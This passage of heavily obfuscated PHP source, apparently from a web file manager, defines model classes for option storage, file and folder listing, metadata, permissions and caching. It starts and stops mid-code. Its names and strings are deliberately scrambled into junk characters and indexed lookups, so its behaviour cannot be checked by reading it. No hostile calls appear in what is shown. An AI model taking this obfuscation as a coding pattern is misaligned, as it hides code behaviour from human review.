valueSet($Ú‚ƒ¬˜ñ, $Ìôî›ø) { $ş»µè¬ =& $_SERVER[å¸¿•¶£]; $±°åèÚú = $ş»µè¬[1672]; CacheLock::lock($±°åèÚú); $éÊ‰›« = Model($ş»µè¬[435])->set($Ú‚ƒ¬˜ñ, $Ìôî›ø, $ş»µè¬[1671]); CacheLock::unlock($±°åèÚú); return $éÊ‰›«; } protected static function log($á¦×šæ) { write_log($á¦×šæ, $_SERVER[å¸¿•¶£][1658]); } private static function cacheClear() { $ÒÖ¿·Œƒ =& $_SERVER[å¸¿•¶£]; Cache::clearMemory(Model($ÒÖ¿·Œƒ[435])->cacheKey($ÒÖ¿·Œƒ[1671])); Cache::clearMemory(Model($ÒÖ¿·Œƒ[435])->cacheKey($ÒÖ¿·Œƒ[1673])); Model($ÒÖ¿·Œƒ[1643])->cacheClear(); self::closeDatabase(); } } goto C¸¡ª“µßÔ; a”ÃÖ¬Œ¹: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ŒÌµ²ûä = false, $ã®íØ‰ = '', $šÔÌı = false) { $İì—…çî =& $_SERVER[å¸¿•¶£]; $¾¸İÉ = $this->cacheGet($ã®íØ‰); $ó ñ´Û¨ = $this->optionDefault($ã®íØ‰); $ó ñ´Û¨ = is_array($ó ñ´Û¨) ? $ó ñ´Û¨ : array(); if (is_array($¾¸İÉ)) { $¾¸İÉ = array_merge($ó ñ´Û¨, $¾¸İÉ); return $ŒÌµ²ûä ? isset($¾¸İÉ[$ŒÌµ²ûä]) ? $¾¸İÉ[$ŒÌµ²ûä] : null : $¾¸İÉ; } $ºûû¡ = $this->filterWhere(array($İì—…çî[33] => $ã®íØ‰)); $¾¸İÉ = $this->where($ºûû¡)->select(); $¾¸İÉ = array_to_keyvalue($¾¸İÉ, $İì—…çî[94], $İì—…çî[374]); foreach ($¾¸İÉ as $ÅÂ¨»áŸ => $¯×°äÇ) { if ($šÔÌı || in_array($ÅÂ¨»áŸ, $this->jsonField)) { $¾¸İÉ[$ÅÂ¨»áŸ] = json_decode($¯×°äÇ, !0); } } $this->cacheSet($ã®íØ‰, $¾¸İÉ); $¾¸İÉ = array_merge($ó ñ´Û¨, $¾¸İÉ); return $ŒÌµ²ûä ? $¾¸İÉ[$ŒÌµ²ûä] : $¾¸İÉ; } public function set($Ø’÷ò‚©, $›Íâì•‡ = false, $™İèÂğ¨ = '') { $Ö îœÃ =& $_SERVER[å¸¿•¶£]; $this->cacheRemove($™İèÂğ¨); $®ã¨ê¸ç = array(); $ÂÛ·á« = is_array($Ø’÷ò‚©) ? $Ø’÷ò‚© : array($Ø’÷ò‚© => $›Íâì•‡); foreach ($ÂÛ·á« as $Ïğâ´Óù => $º¹Êâ) { if (is_array($º¹Êâ)) { $º¹Êâ = json_encode_force($º¹Êâ); } $this->checkLength($º¹Êâ, !1, $this->tableName . $Ö îœÃ[4] . $Ø’÷ò‚©); $º¹Êâ = self::textEncode($º¹Êâ); $ÂÛ·á« = array($Ö îœÃ[33] => $™İèÂğ¨, $Ö îœÃ[94] => $Ïğâ´Óù, $Ö îœÃ[374] => $º¹Êâ); $®ã¨ê¸ç[] = $this->filterWhere($ÂÛ·á«); } if (!$®ã¨ê¸ç) { return !0; } $¢ˆùØÀ = $this->cacheKey($Ö îœÃ[400]); CacheLock::lock($¢ˆùØÀ); $ù±É·æ¡ = $this->addAll($®ã¨ê¸ç, array(), !0); CacheLock::unlock($¢ˆùØÀ); return $ù±É·æ¡; } protected function optionDefault($ØúÙ‰›¨ = '') { return !1; } public function setDeep($Ô„‘òêü, $ª‘Ÿ£ôÆ = false, $ÑÇ²Û‹Ó = '') { $ ·•ŸÃ¯ = explode($_SERVER[å¸¿•¶£][10], $Ô„‘òêü); $ˆå¬§·¦ = $this->get(); array_set_value($ˆå¬§·¦, $Ô„‘òêü, $ª‘Ÿ£ôÆ); $this->set($ ·•ŸÃ¯[0], $ˆå¬§·¦[$ ·•ŸÃ¯[0]], $ÑÇ²Û‹Ó); } public function remove($ŸÈ¶©Ôİ, $Óîò¸º = '') { $ˆ‹Ğà†å =& $_SERVER[å¸¿•¶£]; $this->cacheRemove($Óîò¸º); $ ‡İ²Şê = $this->filterWhere(array($ˆ‹Ğà†å[94] => $ŸÈ¶©Ôİ, $ˆ‹Ğà†å[33] => $Óîò¸º)); if (is_null($ŸÈ¶©Ôİ)) { unset($ ‡İ²Şê[$ˆ‹Ğà†å[94]]); } return $this->where($ ‡İ²Şê)->delete(); } public function cacheSet($ºåÙÌŸ£, $Å´Æ¦ï• = false) { return Cache::set($this->cacheKey($ºåÙÌŸ£), $Å´Æ¦ï•); } public function cacheGet($Ó¾¹ü–Ã) { return Cache::get($this->cacheKey($Ó¾¹ü–Ã)); } public function cacheRemove($‹˜Şüßê) { return Cache::remove($this->cacheKey($‹˜Şüßê)); } protected function filterWhere($ˆÅş˜ÍÌ) { return $ˆÅş˜ÍÌ; } protected function cacheKey($„©¹‡) { return $„©¹‡; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\x72\143\x65"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\141\155\x65" => "\x69\x6f\x5f\x73\157\165\x72\143\x65\x5f\155\145\x74\x61", "\155\145\x74\141\106\x69\145\154\144" => "\163\x6f\165\x72\143\145\x49\x44"); protected $dataAuto = array(array("\x6d\x6f\144\151\146\171\x54\151\x6d\145", "\164\x69\x6d\145", "\x69\x6e\163\145\x72\x74", "\x66\x75\x6e\143\164\x69\157\156"), array("\x63\162\145\141\164\145\124\x69\155\x65", "\x74\x69\x6d\145", "\151\x6e\163\145\x72\x74", "\146\165\x6e\x63\x74\x69\x6f\156"), array("\x76\151\x65\x77\124\151\155\x65", "\164\x69\155\x65", "\151\x6e\x73\145\x72\x74", "\146\x75\156\143\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($î™ûí¸Ä) { return $this->listSource(array($_SERVER[å¸¿•¶£][401] => $î™ûí¸Ä)); } public function typeName($—ş·—ìş) { static $–ÓÕĞºÉ = array(self::TYPE_SYSTEM => "\163\171\x73\164\145\x6d", self::TYPE_USER => "\x75\163\145\162", self::TYPE_GROUP => "\x67\x72\x6f\165\x70"); return $–ÓÕĞºÉ[$—ş·—ìş . $_SERVER[å¸¿•¶£][12]]; } public function sourceListInfo($ŒçĞ¹¿Ç, $Áåï·ìæ = false) { $Éô°Ø¨÷ =& $_SERVER[å¸¿•¶£]; $ŒçĞ¹¿Ç = $ŒçĞ¹¿Ç ? $ŒçĞ¹¿Ç : array(); $ŒçĞ¹¿Ç = array_filter(array_unique($ŒçĞ¹¿Ç)); if (!$ŒçĞ¹¿Ç) { return array(); } $®§ã¿ë¦ = $this->where(array($Éô°Ø¨÷[402] => array($Éô°Ø¨÷[7], $ŒçĞ¹¿Ç)))->select(); $this->_listDataApply($®§ã¿ë¦, $Áåï·ìæ); return array_to_keyvalue($®§ã¿ë¦, $Éô°Ø¨÷[402]); } public function pathInfoFilter(&$ÔÑóÚ²Å) { $›üŠëÃ =& $_SERVER[å¸¿•¶£]; static $ÑËõ†¾ä = false; static $´Õ©¿± = false; static $Çë“„‰ = false; if (!$ÑËõ†¾ä) { $òú·àøÁ = $›üŠëÃ[403]; $òú·àøÁ .= $›üŠëÃ[404]; $òú·àøÁ .= $›üŠëÃ[405]; $à‹ŞĞâû = $›üŠëÃ[406]; $³Ï·«Øâ = explode($›üŠëÃ[50], $à‹ŞĞâû); $ÑËõ†¾ä = explode($›üŠëÃ[50], $òú·àøÁ); $´Õ©¿± = array(); foreach ($ÑËõ†¾ä as $éÖÊ††¸) { if (in_array($éÖÊ††¸, $³Ï·«Øâ)) { continue; } $´Õ©¿±[] = $éÖÊ††¸; } $Çë“„‰ = explode($›üŠëÃ[50], $›üŠëÃ[407]); } foreach ($Çë“„‰ as $úØÒÇŠı) { if (isset($ÔÑóÚ²Å[$úØÒÇŠı])) { $ÔÑóÚ²Å[$úØÒÇŠı] = intval($ÔÑóÚ²Å[$úØÒÇŠı]); } } $ÔÑóÚ²Å[$›üŠëÃ[84]] = $›üŠëÃ[408] . $ÔÑóÚ²Å[$›üŠëÃ[402]] . $›üŠëÃ[409]; $ÔÑóÚ²Å[$›üŠëÃ[33]] = $ÔÑóÚ²Å[$›üŠëÃ[410]] == 1 ? $›üŠëÃ[75] : $›üŠëÃ[200]; $ÔÑóÚ²Å[$›üŠëÃ[411]] = $this->typeName($ÔÑóÚ²Å[$›üŠëÃ[411]]); if ($ÔÑóÚ²Å[$›üŠëÃ[410]] != 1) { $ÔÑóÚ²Å[$›üŠëÃ[174]] = $ÔÑóÚ²Å[$›üŠëÃ[412]]; unset($ÔÑóÚ²Å[$›üŠëÃ[412]]); } $æÂ‘ÉÙ° = $ÑËõ†¾ä; if (isset($ÔÑóÚ²Å[$›üŠëÃ[413]]) && $ÔÑóÚ²Å[$›üŠëÃ[413]][$›üŠëÃ[414]] == -1) { $æÂ‘ÉÙ° = $´Õ©¿±; } $ÔÑóÚ²Å = array_field_key($ÔÑóÚ²Å, $æÂ‘ÉÙ°); return $ÔÑóÚ²Å; } public function listUserFav() { $¥ƒ¤´ƒ =& $_SERVER[å¸¿•¶£]; $’öŸ¥ñ· = Model($¥ƒ¤´ƒ[415])->listData(); $¡Íè‚®Ã = array_filter_by_field($’öŸ¥ñ·, $¥ƒ¤´ƒ[33], $¥ƒ¤´ƒ[416]); $¡Íè‚®Ã = array_to_keyvalue($¡Íè‚®Ã, $¥ƒ¤´ƒ[12], $¥ƒ¤´ƒ[84]); if ($¡Íè‚®Ã) { $˜äŠßôï = $this->listSource(array($¥ƒ¤´ƒ[417] => array($¥ƒ¤´ƒ[418], $¡Íè‚®Ã))); } $˜äŠßôï = array_to_keyvalue($˜äŠßôï[$¥ƒ¤´ƒ[369]], $¥ƒ¤´ƒ[402]); foreach ($’öŸ¥ñ· as &$©¥ÓƒÂğ) { $©¥ÓƒÂğ = array($¥ƒ¤´ƒ[419] => $©¥ÓƒÂğ[$¥ƒ¤´ƒ[399]], $¥ƒ¤´ƒ[420] => $©¥ÓƒÂğ[$¥ƒ¤´ƒ[32]], $¥ƒ¤´ƒ[421] => $©¥ÓƒÂğ[$¥ƒ¤´ƒ[84]], $¥ƒ¤´ƒ[422] => $©¥ÓƒÂğ[$¥ƒ¤´ƒ[33]], $¥ƒ¤´ƒ[423] => $©¥ÓƒÂğ[$¥ƒ¤´ƒ[201]], $¥ƒ¤´ƒ[424] => $©¥ÓƒÂğ[$¥ƒ¤´ƒ[85]]); if ($©¥ÓƒÂğ[$¥ƒ¤´ƒ[33]] == $¥ƒ¤´ƒ[416] && $˜äŠßôï[$©¥ÓƒÂğ[$¥ƒ¤´ƒ[84]]]) { $©¥ÓƒÂğ[$¥ƒ¤´ƒ[87]] = $˜äŠßôï[$©¥ÓƒÂğ[$¥ƒ¤´ƒ[84]]]; } } unset($©¥ÓƒÂğ); return $’öŸ¥ñ·; } public function listUserTag($¥õü¯ä¨) { $´…ÓŸ…¯ =& $_SERVER[å¸¿•¶£]; if ($¥õü¯ä¨ && !is_array($¥õü¯ä¨)) { $¥õü¯ä¨ = array($¥õü¯ä¨); } $í÷ó°˜Ÿ = Model($´…ÓŸ…¯[425])->listData(); $—´ãß…è = array(); $âƒı¡Í½ = array(); foreach ($í÷ó°˜Ÿ as $¢É Ö©Ø) { $•ø™Û“İ = $¢É Ö©Ø[$´…ÓŸ…¯[84]]; if (!$•ø™Û“İ) { continue; } if (!isset($âƒı¡Í½[$•ø™Û“İ])) { $âƒı¡Í½[$•ø™Û“İ] = array(); } $âƒı¡Í½[$•ø™Û“İ][] = $¢É Ö©Ø[$´…ÓŸ…¯[426]]; $—´ãß…è[$¢É Ö©Ø[$´…ÓŸ…¯[84]]] = $¢É Ö©Ø; } $ñ²÷˜¹ß = array(); $ò¹­îÍğ = array(); $¢åˆë¦Û = array(); foreach ($âƒı¡Í½ as $Óù‰ëÀ— => $˜ïó§Æ) { $”•§Ğéø = !0; if (!$¥õü¯ä¨) { $ñ²÷˜¹ß[] = $Óù‰ëÀ—; continue; } foreach ($¥õü¯ä¨ as $µ¯‹«ï•) { if (!in_array($µ¯‹«ï•, $˜ïó§Æ)) { $”•§Ğéø = !1; break; } } if (!$”•§Ğéø) { continue; } if (!is_numeric($Óù‰ëÀ—)) { $¤ú›»ŞŠ = $—´ãß…è[$Óù‰ëÀ—]; $Èü•ïİ = array($´…ÓŸ…¯[32] => $¤ú›»ŞŠ[$´…ÓŸ…¯[32]], $´…ÓŸ…¯[84] => $¤ú›»ŞŠ[$´…ÓŸ…¯[84]], $´…ÓŸ…¯[33] => $¤ú›»ŞŠ[$´…ÓŸ…¯[33]], $´…ÓŸ…¯[87] => array($´…ÓŸ…¯[427] => 1), $´…ÓŸ…¯[202] => !0); if ($¤ú›»ŞŠ[$´…ÓŸ…¯[33]] == $´…ÓŸ…¯[200]) { $¢åˆë¦Û[] = $Èü•ïİ; } if ($¤ú›»ŞŠ[$´…ÓŸ…¯[33]] == $´…ÓŸ…¯[75]) { $ò¹­îÍğ[] = $Èü•ïİ; } continue; } $ñ²÷˜¹ß[] = $Óù‰ëÀ—; } if ($ñ²÷˜¹ß) { $ÖÌŸ Î = $this->listSource(array($´…ÓŸ…¯[417] => array($´…ÓŸ…¯[418], $ñ²÷˜¹ß))); } $ÖÌŸ Î = $ÖÌŸ Î ? $ÖÌŸ Î : array($´…ÓŸ…¯[82] => array(), $´…ÓŸ…¯[83] => array()); $ÖÌŸ Î[$´…ÓŸ…¯[82]] = array_merge($ÖÌŸ Î[$´…ÓŸ…¯[82]], $ò¹­îÍğ); $ÖÌŸ Î[$´…ÓŸ…¯[83]] = array_merge($ÖÌŸ Î[$´…ÓŸ…¯[83]], $¢åˆë¦Û); if (isset($ÖÌŸ Î[$´…ÓŸ…¯[366]]) && count($ñ²÷˜¹ß) == $ÖÌŸ Î[$´…ÓŸ…¯[366]][$´…ÓŸ…¯[367]]) { return $ÖÌŸ Î; } $õ‚É¡¿ = array(); $éÆ”ôŞĞ = array_to_keyvalue($ÖÌŸ Î[$´…ÓŸ…¯[82]], $´…ÓŸ…¯[12], $´…ÓŸ…¯[402]); $ßİÎĞãş = array_to_keyvalue($ÖÌŸ Î[$´…ÓŸ…¯[83]], $´…ÓŸ…¯[12], $´…ÓŸ…¯[402]); $ô§˜¡Õ = array_merge($ßİÎĞãş, $éÆ”ôŞĞ); foreach ($ñ²÷˜¹ß as $•ø™Û“İ) { if (!in_array($•ø™Û“İ, $ô§˜¡Õ)) { $õ‚É¡¿[] = $•ø™Û“İ; } } if ($õ‚É¡¿) { Model($´…ÓŸ…¯[428])->removeBySource($õ‚É¡¿); } return $ÖÌŸ Î; } public function listUserRecycle() { $«€»€ÃÁ =& $_SERVER[å¸¿•¶£]; $¹Ç¼èÑ = Model($«€»€ÃÁ[429])->listData(); if (!$¹Ç¼èÑ) { return array(); } $“àÎüñ½ = array($«€»€ÃÁ[417] => array($«€»€ÃÁ[418], $¹Ç¼èÑ), $«€»€ÃÁ[430] => 1); return $this->listSource($“àÎüñ½); } public function listSource($íêéĞªÈ, $„ñ£Ş¬ = 3000, $ËÁù¥“ = false) { $ÇŸıï‚” =& $_SERVER[å¸¿•¶£]; if (!isset($íêéĞªÈ[$ÇŸıï‚”[431]])) { $íêéĞªÈ[$ÇŸıï‚”[431]] = 0; } if (isset($íêéĞªÈ[$ÇŸıï‚”[432]]) && $íêéĞªÈ[$ÇŸıï‚”[432]] == $ÇŸıï‚”[198]) { $íêéĞªÈ[$ÇŸıï‚”[412]] = array($ÇŸıï‚”[331], $ÇŸıï‚”[433]); } $Ÿëß“µ = $ÇŸıï‚”[434]; $ø™„‘Ï = $this->field($Ÿëß“µ)->_makeOrder()->where($íêéĞªÈ)->selectPage($„ñ£Ş¬); $this->_listPageCheck($ø™„‘Ï, $Ÿëß“µ, $íêéĞªÈ); $this->_listDataApply($ø™„‘Ï[$ÇŸıï‚”[369]], $ËÁù¥“); $this->_listMake($ø™„‘Ï); return $ø™„‘Ï; } private function _listPageCheck(&$‰Àõ‰‡, $¿¼™Ôˆ, $Ò˜ïÅÅ·) { $Ö¼ÖäªÌ =& $_SERVER[å¸¿•¶£]; if (!is_array($‰Àõ‰‡[$Ö¼ÖäªÌ[366]])) { return; } $Ãç›©ØÍ = $‰Àõ‰‡[$Ö¼ÖäªÌ[366]]; if ($Ãç›©ØÍ[$Ö¼ÖäªÌ[368]] <= 1) { return; } if ($Ãç›©ØÍ[$Ö¼ÖäªÌ[367]] >= 100000) { return; } if (Model($Ö¼ÖäªÌ[435])->get($Ö¼ÖäªÌ[436]) != $Ö¼ÖäªÌ[437]) { return; } $¿¼™Ôˆ = str_replace(array($Ö¼ÖäªÌ[53], $Ö¼ÖäªÌ[342], $Ö¼ÖäªÌ[231]), $Ö¼ÖäªÌ[12], $¿¼™Ôˆ); $¿¼™Ôˆ = $Ö¼ÖäªÌ[438] . str_replace($Ö¼ÖäªÌ[50], $Ö¼ÖäªÌ[439], $¿¼™Ôˆ) . $Ö¼ÖäªÌ[440]; $üëú®¤Ó = $Ö¼ÖäªÌ[441]; $üëú®¤Ó = $üëú®¤Ó . $Ö¼ÖäªÌ[442]; $İ™ä¹°¨ = $Ãç›©ØÍ[$Ö¼ÖäªÌ[363]] * ($Ãç›©ØÍ[$Ö¼ÖäªÌ[353]] - 1) . $Ö¼ÖäªÌ[50] . $Ãç›©ØÍ[$Ö¼ÖäªÌ[363]]; $öÀ¢á¬ = $this->_makeOrder(!0); $‡§ÉşÀ = $Ö¼ÖäªÌ[438] . str_replace($Ö¼ÖäªÌ[50], $Ö¼ÖäªÌ[439], $öÀ¢á¬[0]); if (strpos($‡§ÉşÀ, $Ö¼ÖäªÌ[443])) { $‡§ÉşÀ = str_replace($Ö¼ÖäªÌ[443], $Ö¼ÖäªÌ[444], $‡§ÉşÀ); } else { $‡§ÉşÀ .= $Ö¼ÖäªÌ[445] . $öÀ¢á¬[1]; } $“€¸ôÜÙ = array(); foreach ($Ò˜ïÅÅ· as $’¾Œñ›£ => $Ä»ôŒß) { $“€¸ôÜÙ[$Ö¼ÖäªÌ[438] . $’¾Œñ›£] = $Ä»ôŒß; } $this->alias($Ö¼ÖäªÌ[446])->field($¿¼™Ôˆ)->limit($İ™ä¹°¨)->order($‡§ÉşÀ); $˜‘ô·¤Ø = $this->join($üëú®¤Ó)->where($“€¸ôÜÙ)->select(); if ($˜‘ô·¤Ø) { $‰Àõ‰‡[$Ö¼ÖäªÌ[369]] = $˜‘ô·¤Ø; } } protected function _makeOrder($€ªÅÒ = false) { $ËµÓ¢ËŸ =& $_SERVER[å¸¿•¶£]; $Çó…“†ó = Model($ËµÓ¢ËŸ[447])->get($ËµÓ¢ËŸ[448]); $†™²Ÿì = Model($ËµÓ¢ËŸ[447])->get($ËµÓ¢ËŸ[449]); $æ—‡ ú“ = array($ËµÓ¢ËŸ[450] => $ËµÓ¢ËŸ[451], $ËµÓ¢ËŸ[452] => $ËµÓ¢ËŸ[453]); $ÎÙ¨÷Ãš = array($ËµÓ¢ËŸ[32] => $ËµÓ¢ËŸ[32], $ËµÓ¢ËŸ[76] => $ËµÓ¢ËŸ[76], $ËµÓ¢ËŸ[174] => $ËµÓ¢ËŸ[412], $ËµÓ¢ËŸ[454] => $ËµÓ¢ËŸ[454], $ËµÓ¢ËŸ[455] => $ËµÓ¢ËŸ[456], $ËµÓ¢ËŸ[201] => $ËµÓ¢ËŸ[201], $ËµÓ¢ËŸ[85] => $ËµÓ¢ËŸ[85]); $ë‹½Òè = Input::get($ËµÓ¢ËŸ[457], $ËµÓ¢ËŸ[7], $Çó…“†ó, array_keys($ÎÙ¨÷Ãš)); $µĞÚÚ”Å = Input::get($ËµÓ¢ËŸ[458], $ËµÓ¢ËŸ[7], $†™²Ÿì, array_keys($æ—‡ ú“)); if (!in_array($ë‹½Òè, array_keys($ÎÙ¨÷Ãš))) { $ë‹½Òè = $ËµÓ¢ËŸ[32]; } if (!in_array($µĞÚÚ”Å, array_keys($æ—‡ ú“))) { $ë‹½Òè = $ËµÓ¢ËŸ[450]; } if ($ë‹½Òè == $ËµÓ¢ËŸ[32]) { } $ƒ‰ñ¾İ¬ = $ËµÓ¢ËŸ[459] . $ÎÙ¨÷Ãš[$ë‹½Òè] . $ËµÓ¢ËŸ[53] . $æ—‡ ú“[$µĞÚÚ”Å]; $ƒ‰ñ¾İ¬ = rtrim(trim($ƒ‰ñ¾İ¬), $ËµÓ¢ËŸ[50]); if ($€ªÅÒ) { return array($ƒ‰ñ¾İ¬, $æ—‡ ú“[$µĞÚÚ”Å]); } return $this->order($ƒ‰ñ¾İ¬); } protected function _listDataApplyItem($¹©àøÌ¯, $è¯õó = false) { $¶¡ÌÁ¸ = array($¹©àøÌ¯); $this->_listDataApply($¶¡ÌÁ¸, $è¯õó); return $¶¡ÌÁ¸[0]; } protected function _listDataApply(&$½Í¶, $•±§† ş = false) { $Š¼ıõ¹¬ =& $_SERVER[å¸¿•¶£]; if (!$½Í¶) { $½Í¶ = array(); return; } $ÎÒå×Ô  = array_to_keyvalue($½Í¶, $Š¼ıõ¹¬[12], $Š¼ıõ¹¬[402]); $ÎÒå×Ô  = array_unique($ÎÒå×Ô ); $this->_listSourceCache($½Í¶); if (!$•±§† ş) { $this->_listAppendMeta($½Í¶, $ÎÒå×Ô ); $this->_listAppendFileMeta($½Í¶, $ÎÒå×Ô ); $this->_listAppendChildren($½Í¶, $ÎÒå×Ô ); } $this->_listAppendPath($½Í¶); $this->_listAppendAuth($½Í¶); $this->_listAppendSourceInfo($½Í¶, $ÎÒå×Ô ); $this->_listAppendUser($½Í¶); $this->_listFilterInfo($½Í¶, $•±§† ş); $this->_listAppendAuthSecret($½Í¶); } protected function _listSourceCache($©¡‡×®”) { $¢ƒåçéö =& $_SERVER[å¸¿•¶£]; foreach ($©¡‡×®” as $öçñ’š) { self::$cacheSourceInfo[$¢ƒåçéö[460] . $öçñ’š[$¢ƒåçéö[402]]] = $öçñ’š; } } protected function _listFilterInfo(&$Ì«ıãôÛ, $ı¹Ö…ò¼ = false) { $Âà•ïÀ =& $_SERVER[å¸¿•¶£]; foreach ($Ì«ıãôÛ as &$â÷ØÖµö) { $â÷ØÖµö = $this->pathInfoFilter($â÷ØÖµö); self::$cachePathInfo[$Âà•ïÀ[461] . intval($ı¹Ö…ò¼) . $Âà•ïÀ[386] . $â÷ØÖµö[$Âà•ïÀ[402]]] = $â÷ØÖµö; } unset($â÷ØÖµö); } protected function _listMake(&$ç£Ş‡Ù£) { $Şé¸“œˆ =& $_SERVER[å¸¿•¶£]; $ç£Ş‡Ù£[$Şé¸“œˆ[82]] = array(); $ç£Ş‡Ù£[$Şé¸“œˆ[83]] = array(); foreach ($ç£Ş‡Ù£[$Şé¸“œˆ[369]] as $óÀï—´Õ) { $éÏ…½¿­ = $óÀï—´Õ[$Şé¸“œˆ[410]] == 1 ? $Şé¸“œˆ[82] : $Şé¸“œˆ[83]; $ç£Ş‡Ù£[$éÏ…½¿­][] = $óÀï—´Õ; } unset($ç£Ş‡Ù£[$Şé¸“œˆ[369]]); } protected function _listAppendMeta(&$Ş„Ò’¡©, $½ß”×‚) { $ú´Ô¥ˆì =& $_SERVER[å¸¿•¶£]; $áÍÚŒ = array($ú´Ô¥ˆì[417] => array($ú´Ô¥ˆì[418], $½ß”×‚)); $Í­î¨™Ä = Model($ú´Ô¥ˆì[462])->field($ú´Ô¥ˆì[463])->where($áÍÚŒ)->select(); if (!$Í­î¨™Ä) { return; } $æ¯×Ç®” = array($ú´Ô¥ˆì[464], $ú´Ô¥ˆì[465], $ú´Ô¥ˆì[444]); $°øÅÁ†ú = array(); foreach ($Í­î¨™Ä as $ªŠÄ–ôÍ) { if (!isset($°øÅÁ†ú[$ªŠÄ–ôÍ[$ú´Ô¥ˆì[402]]])) { $°øÅÁ†ú[$ªŠÄ–ôÍ[$ú´Ô¥ˆì[402]]] = array(); } if (in_array($ªŠÄ–ôÍ[$ú´Ô¥ˆì[94]], $æ¯×Ç®”)) { continue; } $°øÅÁ†ú[$ªŠÄ–ôÍ[$ú´Ô¥ˆì[402]]][$ªŠÄ–ôÍ[$ú´Ô¥ˆì[94]]] = $ªŠÄ–ôÍ[$ú´Ô¥ˆì[374]]; } foreach ($Ş„Ò’¡© as &$±¿ëÃ¡°) { $±¿ëÃ¡°[$ú´Ô¥ˆì[466]] = !1; if (isset($°øÅÁ†ú[$±¿ëÃ¡°[$ú´Ô¥ˆì[402]]])) { $±¿ëÃ¡°[$ú´Ô¥ˆì[466]] = $°øÅÁ†ú[$±¿ëÃ¡°[$ú´Ô¥ˆì[402]]]; } if ($this->fileIsLock($±¿ëÃ¡°) && $±¿ëÃ¡°[$ú´Ô¥ˆì[413]]) { $á‹Ôûò¾ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $±¿ëÃ¡°[$ú´Ô¥ˆì[413]][$ú´Ô¥ˆì[414]] = AuthModel::authDisable($±¿ëÃ¡°[$ú´Ô¥ˆì[413]][$ú´Ô¥ˆì[414]], $á‹Ôûò¾); $±¿ëÃ¡°[$ú´Ô¥ˆì[413]][$ú´Ô¥ˆì[467]][$ú´Ô¥ˆì[413]] = $±¿ëÃ¡°[$ú´Ô¥ˆì[413]][$ú´Ô¥ˆì[414]]; } } unset($±¿ëÃ¡°); } protected function _listAppendFileMeta(&$éú­¥¦, $“¯Û‡) { $†Ä–ÖËŠ =& $_SERVER[å¸¿•¶£]; $ÜÌÏÃ¾î = array_to_keyvalue($éú­¥¦, $†Ä–ÖËŠ[12], $†Ä–ÖËŠ[468]); $ÜÌÏÃ¾î = array_filter(array_unique($ÜÌÏÃ¾î)); if (!$ÜÌÏÃ¾î) { return; } $ˆ³€©İ‹ = array($†Ä–ÖËŠ[469] => array($†Ä–ÖËŠ[418], $ÜÌÏÃ¾î)); $ÚãÅ®é = $†Ä–ÖËŠ[470]; $‰Ø„Ëª› = Model($†Ä–ÖËŠ[471])->field($ÚãÅ®é)->where($ˆ³€©İ‹)->select(); $‰Ø„Ëª› = array_to_keyvalue($‰Ø„Ëª›, $†Ä–ÖËŠ[468]); $ï¡øÃ­ = Model($†Ä–ÖËŠ[472])->field($†Ä–ÖËŠ[473])->where($ˆ³€©İ‹)->select(); $ï¡øÃ­ = $ï¡øÃ­ ? $ï¡øÃ­ : array(); $ÁßîİÍø = array(); foreach ($ï¡øÃ­ as $½šî‡½) { if (!isset($ÁßîİÍø[$½šî‡½[$†Ä–ÖËŠ[468]]])) { $ÁßîİÍø[$½šî‡½[$†Ä–ÖËŠ[468]]] = array(); } $ÁßîİÍø[$½šî‡½[$†Ä–ÖËŠ[468]]][$½šî‡½[$†Ä–ÖËŠ[94]]] = $½šî‡½[$†Ä–ÖËŠ[374]]; } foreach ($éú­¥¦ as &$”ô¦ò¸) { $óŸ×İ©¶ = $”ô¦ò¸[$†Ä–ÖËŠ[468]]; if (!$óŸ×İ©¶ || !is_array($‰Ø„Ëª›[$óŸ×İ©¶])) { continue; } $¨Úßë©Ş = $‰Ø„Ëª›[$óŸ×İ©¶]; $¨Úßë©Ş[$†Ä–ÖËŠ[76]] = $”ô¦ò¸[$†Ä–ÖËŠ[76]]; $¨Úßë©Ş[$†Ä–ÖËŠ[32]] = $”ô¦ò¸[$†Ä–ÖËŠ[32]]; if (!isset(self::$cacheFileInfo[$†Ä–ÖËŠ[474] . $óŸ×İ©¶])) { self::$cacheFileInfo[$†Ä–ÖËŠ[474] . $óŸ×İ©¶] = array_merge(array(), $¨Úßë©Ş); } unset($‰Ø„Ëª›[$óŸ×İ©¶][$†Ä–ÖËŠ[84]]); $—˜ü¢Ø¯ = is_array($ÁßîİÍø[$óŸ×İ©¶]) ? $ÁßîİÍø[$óŸ×İ©¶] : array(); $”ô¦ò¸[$†Ä–ÖËŠ[170]] = array_merge($—˜ü¢Ø¯, $‰Ø„Ëª›[$óŸ×İ©¶]); if (isset($”ô¦ò¸[$†Ä–ÖËŠ[170]][$†Ä–ÖËŠ[169]])) { $”ô¦ò¸[$†Ä–ÖËŠ[169]] = json_decode($”ô¦ò¸[$†Ä–ÖËŠ[170]][$†Ä–ÖËŠ[169]], !0); unset($”ô¦ò¸[$†Ä–ÖËŠ[170]][$†Ä–ÖËŠ[169]]); } } unset($”ô¦ò¸); } protected function _listAppendSourceInfo(&$§ıº÷ı, $¶¦“–Ñ…) { $°Ïäòë· =& $_SERVER[å¸¿•¶£]; $š·å¨Â€ = Model($°Ïäòë·[475])->listData(); $şè‡Æı÷ = Model($°Ïäòë·[425])->listData(); $¨Şæ¤à = Model($°Ïäòë·[415])->listData(); $µÏıÕüÌ = Model($°Ïäòë·[476])->listSimple(); $¾â¥¦Ê = array_to_keyvalue($š·å¨Â€, $°Ïäòë·[399]); $Ùœû’ÃÙ = array_to_keyvalue_group($şè‡Æı÷, $°Ïäòë·[84], $°Ïäòë·[426]); $®æ¢ÕëŸ = array_to_keyvalue($¨Şæ¤à, $°Ïäòë·[84]); $Ó¨’Á = array_to_keyvalue_group($µÏıÕüÌ, $°Ïäòë·[402]); foreach ($§ıº÷ı as &$ˆÓš‡’á) { $ˆÓš‡’á[$°Ïäòë·[87]] = array($°Ïäòë·[477] => 0, $°Ïäòë·[478] => 0, $°Ïäòë·[479] => 0); if (isset($®æ¢ÕëŸ[$ˆÓš‡’á[$°Ïäòë·[402]]])) { $ˆÓš‡’á[$°Ïäòë·[87]][$°Ïäòë·[480]] = 1; 